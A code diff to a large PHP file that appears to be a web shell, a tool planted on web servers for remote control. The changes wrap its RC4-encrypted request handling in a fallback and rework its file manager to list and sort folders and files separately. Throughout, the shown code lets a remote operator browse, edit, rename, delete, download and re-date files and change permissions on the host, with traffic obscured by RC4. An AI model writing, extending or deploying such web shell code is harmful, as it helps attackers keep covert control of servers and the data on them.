@@ -803,10 +803,15 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	
 	function getData(d, t){
 		b = rc4Init(hash);
+		
+		try {
 		if (t === "e")
 			r = euc(btoa(rc4(randStr(' . $config['rc4drop'] . ') + d, b)));
 		else
 			r = rc4(atob(d), b).substr(' . $config['rc4drop'] . ');
+		} catch(err) {
+			r = d;
+		}
 		
 		return r;
 	}
@@ -1718,13 +1723,13 @@ if (isset($p['me']) && $p['me'] === 'file'){
 						fileList($typ, $dir . $file, $limit, $page, $find, $rec, $count);
 					else if ($show && $sFolder && checkFile($dir . $file, $onlyW, $find))
 						//yield array('t'=>'d', 'n'=>$file);
-						$dData[$count] = array('t'=>'d', 'n'=>$file);
+						$dData['d'][] = $file;
 						
 					$count++;
 				} else if (is_file($dir . $file) && $sFile){
 					if ($show && checkFile($dir . $file, $onlyW, $find))
 						//yield array('t'=>'f', 'n'=>$file);
-						$dData[$count] = array('t'=>'f', 'n'=>$file);
+						$dData['f'][] = $file;
 						
 					$count++;
 				} //TODO syslinks 
@@ -2076,7 +2081,6 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		if (is_dir($currentdir)){
 			$bg = 2;
 			$c = $d = 0;
-			$sBuffFiles = '';
 			$drf = fixRoute($_SERVER['DOCUMENT_ROOT']);
 			$baseURL = str_replace(DS, '/', str_replace($drf, '', $currentdir));
 			$isLinked = strncasecmp($drf, $currentdir, strlen($_SERVER['DOCUMENT_ROOT'])) === 0 ? true : false;
@@ -2092,16 +2096,19 @@ if (isset($p['me']) && $p['me'] === 'file'){
 				</tr></thead>
 				<tbody>';
 			
-			foreach (fileList($p['fm_mode'], $currentdir, $config['FMLimit'], $p['pg'], isset($p['fm_onlyW']), $p['fm_find'], isset($p['fm_rec'])) as $file){
-				$ft = filemtime($currentdir . $file['n']);
-				if ($file['t'] === 'd') {
+			$dData = array();
+			fileList($p['fm_mode'], $currentdir, $config['FMLimit'], $p['pg'], isset($p['fm_onlyW']), $p['fm_find'], isset($p['fm_rec']));
+			
+			@natcasesort($dData['d']);
+			foreach ($dData['d'] as $file){
 					$d++;
-					$sBuff .= '<tr data-path="' . $file['n'] . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
-						<td><input type="checkbox" value="' . $file['n'] . DS . '" name="dl[]"></td>
-						<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file['n'] . '</a></td>
+				$ft = filemtime($currentdir . $file);
+				$sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
+					<td><input type="checkbox" value="' . $file . DS . '" name="dl[]"></td>
+					<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file . '</a></td>
 						<td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
 						<td><a href="#" onclick="viewSize(this);return false;">[?]</a></td>
-						' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file['n']) . '</a>&nbsp;' . getUser($currentdir . $file['n']) . '</td>' : '') . '
+					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . '</td>' : '') . '
 						<td>
 						<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
 						<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
@@ -2109,18 +2116,23 @@ if (isset($p['me']) && $p['me'] === 'file'){
 						<div onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, true)));return false;" class="image edit"></div>
 						</td>
 						</tr>';
-				} else {
+			}
+			unset($dData['d']);
+			
+			@natcasesort($dData['f']);
+			foreach ($dData['f'] as $file){
 					$c++;
-					$sBuffFiles .= '<tr data-path="' . $file['n'] . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
-						<td><input type="checkbox" value="' . $file['n'] . '" name="dl[]"></td><td>';
+				$ft = filemtime($currentdir . $file);
+				$sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
+					<td><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';
 
-					if ($currentdir . $file['n'] === __file__) $sBuffFiles .= '<div class="image php"></div><font class="my">' . $file['n'] . '</font>';
-					else if($isLinked) $sBuffFiles .= showIcon($file['n']) . ' <a href="' . $baseURL . $file['n'] . '" target="_blank">' . $file['n'] . '</a>';
-					else $sBuffFiles .= showIcon($file['n']) . ' ' . $file['n'];
+				if ($currentdir . $file === __file__) $sBuff .= '<div class="image php"></div><font class="my">' . $file . '</font>';
+				else if($isLinked) $sBuff .= showIcon($file) . ' <a href="' . $baseURL . $file . '" target="_blank">' . $file . '</a>';
+				else $sBuff .= showIcon($file) . ' ' . $file;
 					   
-					$sBuffFiles .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
-						<td>' . sizecount(filesize64($currentdir . $file['n'])) . '</td>
-						' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file['n']) . '</a>&nbsp;' . getUser($currentdir . $file['n']) . '</td>' : '') . '
+				$sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;" data-ft="' . date('Y-m-d H:i:s', $ft) . '">' . date($config['datetime'], $ft) . '</a></td>
+					<td>' . sizecount(filesize64($currentdir . $file)) . '</td>
+					' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . '</td>' : '') . '
 						<td>
 						<div onclick="showUI(\'del\', this);return false;" class="image del"></div>
 						<div onclick="showUI(\'ren\', this);return false;" class="image rename"></div>
@@ -2129,10 +2141,8 @@ if (isset($p['me']) && $p['me'] === 'file'){
 						<div onclick="dl(this);return false;" class="image download"></div>
 						</td></tr>';
 				}
-			}
+			unset($dData['f']);
 			
-			$sBuff .= $sBuffFiles;
-			unset($sBuffFiles);
 			$sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 				<td width="2%">' . mCheck('chkall', '', 'CheckAll(this.form);') . '</td>
 				<td>' . tText('selected', 'Selected')  . ': ' . mLink(tText('download', 'Download'), 'showUISec("comp")') . ' | ' . 
